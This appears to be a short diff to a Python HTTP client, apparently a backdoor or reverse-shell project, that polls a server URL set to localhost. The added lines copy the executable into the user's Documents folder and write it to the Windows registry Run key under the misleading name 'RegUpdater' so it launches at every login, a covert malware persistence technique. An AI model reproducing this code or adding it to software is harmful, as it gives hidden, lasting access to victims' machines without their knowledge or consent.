@@ -5,8 +5,27 @@ import requests
 import subprocess
 import time
 import os
+import shutil
+import winreg
 
 SERVER_URL = "http://127.0.0.1"
+
+path = os.getcwd().strip('\n')
+
+Null, userprof = subprocess.check_output("set USERPROFILE", shell=True).split("=")
+
+destination = userprof.strip("\n\r") + "\\Documents\\" + "http_client.exe"
+
+if not os.path.exists(destination):
+
+    shutil.copyfile(path + "\http_client.exe", destination)
+
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+
+    winreg.SetValueEx(key, "RegUpdater", 0, winreg.REG_SZ, destination)
+
+    key.Close()
+
 
 while True:
 
